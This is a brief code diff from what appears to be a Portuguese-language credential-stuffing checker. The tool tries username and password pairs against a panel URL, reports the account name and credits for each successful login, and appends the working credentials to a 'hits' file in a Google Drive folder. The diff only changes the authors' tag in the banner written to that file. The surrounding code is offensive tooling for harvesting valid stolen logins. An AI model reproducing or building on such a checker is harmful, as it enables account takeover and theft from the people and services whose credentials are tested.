@@ -106,7 +106,7 @@ def process_account(username, password, i, total, base_url):
         print(f" ===<use infos/>===\n • Nome: {name}")
         print(f" • Créditos: {credits}")
         with open("/content/drive/MyDrive/_Paineis/combo/hits/one_tv_hits.txt", "a") as hit_file:
-            hit_file.write(f"\n===<Sr.Hell/>===\n• User: {username}\n• Pass: {password}\n• URL: {base_url}\n===<info user/>===\n• Nome: {name}\n• Créditos: {credits}\n")
+            hit_file.write(f"\n===<Sr.Hell e Mr.Arujá/>===\n• User: {username}\n• Pass: {password}\n• URL: {base_url}\n===<info user/>===\n• Nome: {name}\n• Créditos: {credits}\n")
         return True
     else:
         print(VERMELHO + f"\nLogin inválido: {username}:{password}" + RESET)
